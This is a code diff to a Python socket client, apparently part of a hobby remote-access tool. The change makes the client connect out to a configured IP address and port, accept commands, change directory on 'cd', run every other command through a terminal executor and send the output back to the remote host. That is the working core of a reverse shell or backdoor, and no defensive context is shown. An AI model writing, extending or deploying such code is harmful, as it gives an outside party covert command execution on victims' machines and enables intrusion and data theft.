@@ -1,18 +1,18 @@
 import sys
 import json
 import socket
-import time
 import os
-import subprocess
-from handleCommunication import HandleCommunication
+from ExecuteTerminal import TermialExecutor
 
 byt = 1024 * 10
 
+terminal = TermialExecutor()
+
 
 # message Generator
-def generate_Message(msg):
+def generate_Message(command):
     try:
-        jsondata = json.dumps(msg)
+        jsondata = json.dumps(command)
         return jsondata.encode()
     except Exception as ex:
         print(f"[-] generate message error :{str(ex)}")
@@ -54,10 +54,22 @@ def main():
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((IP_ADDRESS, PORT))
         while True:
-            msg = receive_Message(sock)
-            print(msg)
-            if msg == "quit":
+            command = receive_Message(sock)
+            print(f"[+] COMMAND:~>{command}")
+            if command == "quit":
                 exit()
+            if command[0:3] == "cd ":
+                directory = command[3:].strip()
+                try:
+                    os.chdir(directory)
+                    print("Current directory:", os.getcwd())
+                except Exception as ex:
+                    print("Directory change failed:", str(ex))
+                send_Message(sock, os.getcwd())
+                continue
+            # EXECUTE THE COMMAND
+            result = terminal.execute(command)
+            send_Message(sock, result)
     except Exception as ex:
         print(f"[-] Error :{str(ex)}")
         exit()
